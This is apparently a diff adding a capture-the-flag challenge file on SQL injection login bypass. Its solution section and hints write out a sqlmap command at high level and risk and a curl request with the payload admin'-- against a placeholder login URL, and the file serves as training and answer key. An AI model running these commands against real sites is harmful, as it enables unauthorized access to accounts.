@@ -1,0 +1,38 @@
+# Web Security Challenge: SQL Injection
+difficulty: intermediate
+points: 150
+prerequisites:
+  basics: 5
+  web_security: 3
+
+description: |
+  You've discovered a login form at http://vulnerable-site.com/login.
+  Your task is to perform a SQL injection to bypass the login.
+
+setup:
+  - echo "Creating vulnerable login page..."
+  - echo "Database initialized with admin credentials"
+
+solution:
+  commands:
+    - "sqlmap -u \"http://vulnerable-site.com/login\" --data=\"username=admin&password=*\" --level=5 --risk=3"
+    - "curl -X POST http://vulnerable-site.com/login -d \"username=admin'--&password=any\""
+
+task: |
+  Bypass the login form using SQL injection techniques.
+  Try to log in as the admin user without knowing the password.
+
+hints:
+  - "What happens if you enter a single quote in the username field?"
+  - "Try using the SQL comment character after the username"
+  - "The payload should look like: admin'--"
+
+success_message: |
+  Great job! You've successfully performed a SQL injection attack.
+  This is a common vulnerability where user input is directly
+  concatenated into SQL queries without proper sanitization.
+
+resources:
+  - "OWASP SQL Injection Prevention Cheat Sheet"
+  - "SQLMap documentation"
+  - "Web Application Hacker's Handbook"
